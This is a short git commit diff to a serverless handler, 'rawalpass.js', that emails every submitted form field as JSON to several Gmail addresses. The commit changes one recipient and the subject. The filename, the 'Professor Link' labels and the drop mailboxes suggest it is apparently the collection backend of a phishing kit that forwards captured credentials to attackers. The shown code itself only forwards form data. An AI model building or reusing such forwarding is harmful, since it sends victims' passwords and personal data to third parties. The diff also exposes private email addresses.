63a95ba7535a7bd6b12e63a7d65fbdf59d253618
linkquarry-hub <linkquarry@gmail.com>
2025-12-14 13:54:02 +0500

    Update rawalpass.js

--- rawalpass.js
+++ rawalpass.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
     // ✅ Send email
     await transporter.sendMail({
       from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
-      to: "linkquarry@gmail.com,fahadali123gg@gmail.com,rwlrathor@gmail.com",
-      subject: "rawal",
+      to: "linkquarry@gmail.com,fahadali123gg@gmail.com,fteam6150@gmail.com",
+      subject: "Tanvir",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
     });
